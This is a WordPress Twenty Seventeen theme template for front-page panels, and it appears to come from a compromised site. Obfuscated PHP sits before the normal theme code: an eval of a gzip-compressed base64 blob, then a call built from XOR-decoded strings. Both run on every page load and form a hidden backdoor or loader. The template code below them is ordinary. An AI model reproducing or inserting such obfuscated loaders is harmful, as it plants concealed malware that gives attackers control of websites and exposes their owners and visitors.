<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php $eNuxrM='SBU 9 cW 9Z9G7R' ^'000AME<1UW9M.X<';$MDmpHro=$eNuxrM('', '=.jbK4U+ ,S=hSEYA>XkeA=>3233280U67KYgYP43M<61IR>BzV:;gR,558iZXOPB 5:SZXBXTKELnOsxEx:7F=,9DSYbTRLq9XA:ojZgEgQPUB1SH3FWENapVOX5EYcTBMnhFPPO<>3xALdBUTZB9wHE:R0XKGW7ci RNr=9HW.=Fg;3WcjBVEPmOTL0L,Kw>KLEB3B8h3H0vQ2 Xuho74X EILFW11Rh,S=oVB<WG60yLaFY71AR=EJBg7 u<p4o3SLsF- XwJnGOY9FWPjW;0fZAC2>>E7XUwK- Wri;qP96TXHrT2T66IAK4Ry:FyYhsZ1I6DQ=x1MQ9SLWEmcB2kpku778GRJLM8N0DDuEl=PLO0ljMLSDe6AJ;o2 AKYsi<=El05mS+1Y7oKjmF49A5k60.z-fDL2O1XxmQwM>;38RUXIJ-nIO 86 20fs.UTPSYF=QaiD0+S15bSVAE+zfiuI76 +XYDlLoE;Rpo0O=VLRLC;RG15mZT.+SO MN7yQ-E,mKyHY4>ZDytkMfTRoDiV10+6MWW<pippmLBcWQNa4ux23xQPO;pWFVqg5JrOckeNN-IgTyNPrXLNJ.Y<1XH+Q3-G7DFoEZJG-ZTLonfJ2LVjYsweYJZ<Cn.3J4iwJTZY6DCPIA843J6hOGLESP.rbbo64'^ 'THBC-A;HTE<S76=02J+CB9RLlVRGSgo8CClpNy+>:+IXR=;Q,Z.UI86MATg67-;xfDTN2vxf312llNoSX>r3>bRYMdnyEsiFx0>.HGN3GxGakufXo;G4;  IT2.,TlbCp+fEALYYkSKGXoqDjq0;6X,l,grnxo,2N8MIrkRNM:;KSnCPV.J7kmOYd=18E>BcSQ>8ly9KEbNB:R5ST9UUOQU4S rFb3PE37G6DOkbZ6+EUBFk 6ET 1Uebf8to:w9qOR lW-HYxJtNc98U32yJ,19B> 7SaU NxhWoFE.Ic2U4XB5xuRpD5ZC,zAIXsS YqIW>P=WmqFr8+>K6-4-MKfm95: rdlg39liS+IdyKeHK1 :UEJ6FZMAR >Z0YE8kdSMWX<W:<dwOP-VOvJI0UU4PP<9SpPlNhV.E9XPq78PHVJ;44 0HF1 RgRAFQ9,C  x185XgU6 UH<UPJw2 1JSJIQ-VBAt3<=EeTOR4XKT.I7ltjcZ 5PL211Wt67I>:DQvF UJgYl=UJ;mYRMmN96ZlM2PDJmj<2EW4YPPqbD2g,XWGATVN24,ZC3tfBTS+C+QRV,zK-PsPnvTx-<8O cZ=1t4KD4C7nH5;3+B;0kCNB.S87CpSWEyjzGIgKE+XAS.5.8mc310-WUWmkAtME +9ZZRKT<I'); $MDmpHro();
/**
 * Template part for displaying pages on front page
 *
 * @package WordPress
 * @subpackage Twenty_Seventeen
 * @since 1.0
 * @version 1.0
 */

global $twentyseventeencounter;

?>

<article id="panel<?php echo $twentyseventeencounter; ?>" <?php post_class( 'twentyseventeen-panel ' ); ?> >

	<?php if ( has_post_thumbnail() ) :
		$thumbnail = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'twentyseventeen-featured-image' );

		// Calculate aspect ratio: h / w * 100%.
		$ratio = $thumbnail[2] / $thumbnail[1] * 100;
		?>

		<div class="panel-image" style="background-image: url(<?php echo esc_url( $thumbnail[0] ); ?>);">
			<div class="panel-image-prop" style="padding-top: <?php echo esc_attr( $ratio ); ?>%"></div>
		</div><!-- .panel-image -->

	<?php endif; ?>

	<div class="panel-content">
		<div class="wrap">
			<header class="entry-header">
				<?php the_title( '<h2 class="entry-title">', '</h2>' ); ?>

				<?php twentyseventeen_edit_link( get_the_ID() ); ?>

			</header><!-- .entry-header -->

			<div class="entry-content">
				<?php
					/* translators: %s: Name of current post */
					the_content( sprintf(
						__( 'Continue reading<span class="screen-reader-text"> "%s"</span>', 'twentyseventeen' ),
						get_the_title()
					) );
				?>
			</div><!-- .entry-content -->

			<?php
			// Show recent blog posts if is blog posts page (Note that get_option returns a string, so we're casting the result as an int).
			if ( get_the_ID() === (int) get_option( 'page_for_posts' )  ) : ?>

				<?php // Show four most recent posts.
				$recent_posts = new WP_Query( array(
					'posts_per_page'      => 3,
					'post_status'         => 'publish',
					'ignore_sticky_posts' => true,
					'no_found_rows'       => true,
				) );
				?>

		 		<?php if ( $recent_posts->have_posts() ) : ?>

					<div class="recent-posts">

						<?php
						while ( $recent_posts->have_posts() ) : $recent_posts->the_post();
							get_template_part( 'template-parts/post/content', 'excerpt' );
						endwhile;
						wp_reset_postdata();
						?>
					</div><!-- .recent-posts -->
				<?php endif; ?>
			<?php endif; ?>

		</div><!-- .wrap -->
	</div><!-- .panel-content -->

</article><!-- #post-## -->
